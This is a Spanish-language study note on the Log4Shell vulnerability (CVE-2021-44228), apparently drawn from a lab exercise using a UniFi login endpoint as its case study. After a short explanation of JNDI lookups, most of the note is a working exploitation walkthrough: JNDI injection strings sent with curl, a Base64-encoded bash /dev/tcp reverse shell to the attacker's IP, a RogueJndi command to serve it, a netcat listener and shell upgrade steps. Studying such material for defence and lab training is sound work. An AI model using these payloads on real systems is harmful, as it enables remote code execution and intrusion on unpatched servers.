
# Log4Shell (CVE-2021-44228): Ejecución Remota de Código por Inyección JNDI

Este apunte explica la vulnerabilidad crítica **Log4Shell** (CVE-2021-44228), una vulnerabilidad de ejecución remota de código (RCE) que afecta a la librería de logging Apache Log4j. Detalla cómo se produce la explotación a través de la inyección JNDI y el uso de herramientas para lograr RCE en aplicaciones vulnerables.

---

## ¿Qué es Apache Log4j?

**Apache Log4j** es una librería de código abierto escrita en Java, ampliamente utilizada en aplicaciones y servicios de todo el mundo para registrar información. Este registro es esencial para la depuración, auditoría y monitoreo del rendimiento de las aplicaciones. Debido a su vasta adopción, Log4j es un componente fundamental en muchas infraestructuras tecnológicas modernas, desde aplicaciones web hasta servicios empresariales y software de terceros.

---

## La Vulnerabilidad: Log4Shell (CVE-2021-44228)

La vulnerabilidad **Log4Shell** (CVE-2021-44228) afecta a las versiones de Log4j 2.0-beta9 hasta la 2.14.1. El problema reside en la funcionalidad de "Message Lookup Substitution" (sustitución de búsqueda de mensajes) de Log4j.

Log4j permite a los mensajes de log incluir "Lookups", que son mecanismos para recuperar valores dinámicos de diferentes fuentes. Una de estas fuentes es **JNDI (Java Naming and Directory Interface)**. JNDI es una API de Java que permite a las aplicaciones buscar recursos (objetos y datos) distribuidos en una red, como directorios LDAP, servicios de nombres RMI, etc.

La explotación de Log4Shell ocurre cuando un atacante puede inyectar una cadena de texto maliciosa que contiene una JNDI Lookup (por ejemplo, `${jndi:ldap://[servidor-atacante]/clase_maliciosa}`). Si esta cadena es procesada por Log4j (por ejemplo, al ser registrada en un log), el servidor vulnerable intentará realizar una conexión al servidor especificado en la URL JNDI (un servidor LDAP o RMI controlado por el atacante).

Cuando el servidor vulnerable se conecta a este servidor malicioso, el atacante puede responder con una referencia a una clase Java remota. El servidor vulnerable intenta entonces descargar y deserializar esta clase Java. Si la clase Java es maliciosa, su deserialización puede llevar a la **ejecución de código arbitrario** en el sistema del servidor, con los mismos privilegios que la aplicación vulnerable de Log4j.

**Flujo simplificado del ataque Log4Shell:**

1.  **Inyección:** Un atacante inyecta una cadena maliciosa (ej., `${jndi:ldap://[IP_ATACANTE]:[PUERTO_LDAP]/[REFERENCIA]}`) en un campo de entrada de una aplicación.
2.  **Logging:** La aplicación vulnerable usa Log4j para registrar esta entrada (ej., en un log de errores o acceso).
3.  **JNDI Lookup:** Log4j procesa la cadena y, al reconocer la sintaxis JNDI, intenta realizar una consulta al servidor especificado en la URL.
4.  **Conexión Externa:** El servidor vulnerable establece una conexión (ej., LDAP) con el servidor del atacante.
5.  **Payload Servido:** El servidor del atacante responde con una referencia a un objeto/clase Java malicioso.
6.  **Carga y Ejecución:** El servidor vulnerable intenta descargar y deserializar la clase Java. Si tiene éxito, el código malicioso contenido en la clase se ejecuta, logrando RCE.

---

## Fases de Explotación General de Log4Shell

El proceso de explotación de Log4Shell generalmente sigue las siguientes fases:

### 1. Detección de la Vulnerabilidad (JNDI Lookup)

Antes de lanzar un ataque completo, es crucial verificar si el sistema es realmente vulnerable y si está procesando las cadenas JNDI.

**Concepto:** Se envía una petición con una cadena JNDI que apunta a una IP y puerto bajo nuestro control. Se monitorea el tráfico para ver si el servidor vulnerable intenta iniciar una conexión.

1.  **Ponerse a la escucha para el tráfico LDAP en la máquina atacante:**
    En tu máquina atacante, abre una terminal y monitoriza el puerto LDAP (389) en la interfaz de red que uses para el ataque (ej., `tun0`, `eth0`). Esto permitirá ver cualquier intento de conexión entrante.

    ```bash
    tcpdump -i tun0 port 389
    ```

    * `tcpdump`: Herramienta para capturar y analizar tráfico de red.
    * `-i tun0`: Especifica la interfaz de red a monitorizar.
    * `port 389`: Filtra el tráfico solo para el puerto LDAP.

2.  **Enviar el payload de prueba a la aplicación objetivo:**
    Identifica un campo de entrada en la aplicación web o servicio que pueda ser logueado por Log4j (ej., campos de usuario, contraseñas, encabezados HTTP como `User-Agent`, parámetros de URL, etc.).
    Reemplaza `[IP_ATACANTE]` con la IP de tu máquina.

    ```http
    POST /ruta/a/endpoint/vulnerable HTTP/1.1
    Host: [IP_OBJETIVO]:[PUERTO]
    Content-Type: application/json
    Content-Length: [Calcula la longitud apropiada]

    {"param_vulnerable":"${jndi:ldap://[IP_ATACANTE]/}", "otro_param": "valor"}
    ```

    **Ejemplo usando `curl` (UniFi como caso de estudio):**

    ```bash
    curl -X POST -H "Content-Type: application/json" -d '{"username":"test","password":"test","remember":"${jndi:ldap://10.10.14.92/}", "strict":true}' https://[IP_UNIFI]:8443/api/login --insecure
    ```

    En este ejemplo específico de UniFi, el campo `remember` del endpoint `/api/login` es vulnerable.

3.  **Corroborar la conexión en `tcpdump`:**
    Si la aplicación es vulnerable, verás una conexión entrante en tu `tcpdump` desde la IP del objetivo a tu IP en el puerto LDAP (389).

    ```
    listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
    22:32:06.697503 IP [IP_OBJETIVO].49590 > [IP_ATACANTE].ldap: Flags [S], seq 1616762290, win 64240, options [mss 1362,sackOK,TS val 3116354986 ecr 0,nop,wscale 7], length 0
    22:32:06.697544 IP [IP_ATACANTE].ldap > [IP_OBJETIVO].49590: Flags [R.], seq 0, ack 1616762291, win 0, length 0
    ```

    La presencia de estos paquetes confirma que el servidor objetivo está procesando la cadena JNDI y tratando de resolverla, lo que indica que es vulnerable.

### 2. Construcción del Payload de Ejecución de Comandos (Reverse Shell)

Para lograr una ejecución de comandos (por ejemplo, una reverse shell), necesitamos que el servidor vulnerable ejecute un comando de nuestro agrado. Es una buena práctica codificar el comando en Base64 para evitar problemas de caracteres o codificación.

**Codificar el comando de reverse shell:**
Usa el siguiente comando para codificar tu payload. Sustituye `[IP_ATACANTE]` por la IP de tu máquina y `[PUERTO_LISTENER]` por el puerto donde Netcat estará a la escucha.

```bash
echo 'bash -c bash -i >&/dev/tcp/[IP_ATACANTE]/[PUERTO_LISTENER] 0>&1' | base64 -w 0
```

* `bash -c '...'`: Inicia un subshell bash para ejecutar el comando.
* `bash -i >&/dev/tcp/[IP_ATACANTE]/[PUERTO_LISTENER] 0>&1`: El comando de reverse shell. Envía stdin/stdout/stderr a través de una conexión TCP a tu IP y puerto.
* `base64 -w 0`: Codifica la salida en Base64. `-w 0` evita el "word wrap" que puede añadir saltos de línea indeseados.

**Ejemplo de salida** (la cadena Base64 generada será diferente cada vez):

```
YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuOTIvNDQzIDA+JjEK
```

Guarda esta cadena Base64.

**Construir el comando para el servidor JNDI malicioso (ej. RogueJndi):**
El servidor JNDI malicioso (como RogueJndi) necesita recibir un comando de ejecución. Este comando complejo decodificará la cadena Base64 y la ejecutará. Sustituye `[CADENA_BASE64]` con la que obtuviste en el paso anterior.

```bash
bash -c '{echo,[CADENA_BASE64]}|{base64,-d}|{bash,-i}'
```

Este comando usa expansiones de brace (`{}`) y pipes para decodificar la cadena Base64 y ejecutarla como un comando de bash interactivo en el objetivo.

### 3. Fase de Explotación: Ejecución del Servidor JNDI Malicioso y Listener

Ahora, ejecutaremos la herramienta que actuará como nuestro servidor JNDI malicioso y pondremos nuestro listener de Netcat para capturar la reverse shell.

**Ejecutar el servidor JNDI malicioso (ej. RogueJndi):**
Usa una herramienta como RogueJndi (previamente compilada) para servir el payload. Abre una nueva terminal en tu máquina atacante.

```bash
java -jar RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuOTIvNDQzIDA+JjEK}|{base64,-d}|{bash,-i}" --hostname "[IP_ATACANTE]"
```

* `java -jar RogueJndi-1.1.jar`: Ejecuta la aplicación RogueJndi.
* `--command "..."`: Aquí le pasamos el comando complejo que decodificará y ejecutará nuestra reverse shell.
* `--hostname "[IP_ATACANTE]"`: Crucial. Esta es la IP de tu máquina atacante (la que el servidor objetivo usará para contactar al servidor LDAP y descargar el payload).

**Qué hace el servidor JNDI malicioso (ej. RogueJndi):**
Este tipo de herramientas inician un servidor LDAP (por defecto en el puerto 1389) y un servidor HTTP (por defecto en el puerto 8000 o similar). Cuando el servidor vulnerable intente resolver la URL JNDI, se conectará al LDAP. El servidor JNDI malicioso le indicará entonces al objetivo que descargue un objeto Java malicioso desde el servidor HTTP (el mismo atacante) que contiene el comando a ejecutar. Al deserializar y cargar ese objeto, el servidor objetivo ejecutará el comando especificado.

**Configurar el listener de Netcat para la reverse shell:**
Abre otra nueva terminal en tu máquina atacante y pon Netcat a la escucha en el puerto que especificaste en tu payload de reverse shell (ej., 443).

```bash
sudo nc -lvnp [PUERTO_LISTENER]
```

* `sudo`: Puede ser necesario para escuchar en puertos bajos (como 443).
* `-l`: Modo de escucha.
* `-v`: Modo verbose.
* `-n`: No resuelva nombres DNS.
* `-p [PUERTO_LISTENER]`: Escucha en el puerto especificado.

### 4. Envío del Payload Final para Ejecutar la Shell

Con el servidor JNDI malicioso y Netcat a la escucha, es el momento de enviar la inyección final a la aplicación objetivo.

**Enviar el payload JNDI a la aplicación vulnerable:**
Usa tu herramienta proxy (ej. Burp Suite) para interceptar y modificar una petición, o usa `curl`.
Asegúrate de sustituir `[IP_OBJETIVO]` por la IP del servidor vulnerable y `[IP_ATACANTE]` por la IP de tu máquina.

```bash
curl -X POST -H "Content-Type: application/json" -d '{"param_vulnerable":"${jndi:ldap://[IP_ATACANTE]:1389/o=payload}", "otro_param":"valor"}' http://[IP_OBJETIVO]:[PUERTO]/[RUTA] --insecure
```

* `"${jndi:ldap://[IP_ATACANTE]:1389/o=payload}"`: Esta es la URL JNDI que inyectamos.
* `[IP_ATACANTE]:1389`: Es la dirección y el puerto de tu servidor LDAP malicioso.
* `/o=payload`: Es una referencia genérica que el servidor JNDI malicioso interpreta para servir el payload.

**Ejemplo específico (UniFi como caso de estudio):**

```bash
curl -X POST -H "Content-Type: application/json" -d '{"username":"test","password":"test","remember":"${jndi:ldap://10.10.14.92:1389/o=tomcat}", "strict":true}' https://[IP_UNIFI]:8443/api/login --insecure
```

### 5. Recepción de la Shell y Post-Explotación

Si todo ha ido bien, deberías ver una conexión entrante en tu listener de Netcat y, de inmediato, tendrás una shell en la máquina objetivo.

```
listening on [any] 443 ...
connect to [10.10.14.92] from (UNKNOWN) [IP_OBJETIVO] [PUERTO_ORIGEN]
id
uid=1000(usuario_vulnerable) gid=1000(grupo_vulnerable) groups=1000(grupo_vulnerable)
```

**Tratamiento de TTY** (Opcional, pero recomendado para una shell funcional):
Una vez que obtengas la shell, es probable que sea una shell "no interactiva" (no se puede usar Ctrl+C, no hay autocompletado, etc.). Para mejorarla, puedes hacer un tratamiento de TTY. Un método común es:

**En la shell obtenida:**

```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**En tu terminal local** (donde tienes el listener de Netcat):
Presiona `Ctrl+Z` para enviar netcat al fondo.

```bash
stty raw -echo; fg
```

* `stty raw -echo`: Configura tu terminal para que no haga eco de lo que escribes y envíe caracteres crudos.
* `fg`: Trae Netcat de nuevo al frente.

**De nuevo en la shell obtenida** (después de ejecutar `python3`):

```bash
export TERM=xterm
stty rows <YOUR_ROWS> columns <YOUR_COLS>
```

Reemplaza `<YOUR_ROWS>` y `<YOUR_COLS>` con el tamaño de tu terminal actual (puedes obtenerlo con el comando `stty -a` en tu terminal local).

---